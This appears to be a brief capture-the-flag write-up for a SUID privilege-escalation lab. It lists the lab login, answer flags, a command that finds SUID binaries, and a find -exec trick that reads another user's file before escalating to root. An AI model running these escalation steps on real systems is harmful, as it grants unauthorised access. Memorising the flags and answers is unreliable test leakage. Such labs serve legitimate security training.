# SUID Shenanigans

Username: holly
Password: tuD@4vt0G\*TU

1. What port is SSH running on?
   Ans: 65534

2. Find and run a file as igor. Read the file /home/igor/flag1.txt
   Ans: `THM{d3f0708bdd9accda7f937d013eaf2cd8}`
   1. SUID: A file which is set `-rwsr-xr-x`, SUID permission lets whoever executing the file have privileges as owner or that file.
      To find files with SUID set: `holly@ip-10-49-156-168:/home/igor$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`
   2. One of that command is `find` use it to cat the flag in igor's home folder.
      `find . -name fooo -exec cat flag1.txt \;`

3. Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
   Ans:`THM{8c8211826239d849fa8d6df03749c3a2} `
   1. Find commands with SUID privileges.
   2. Look through each command
   3. exec `system-control`
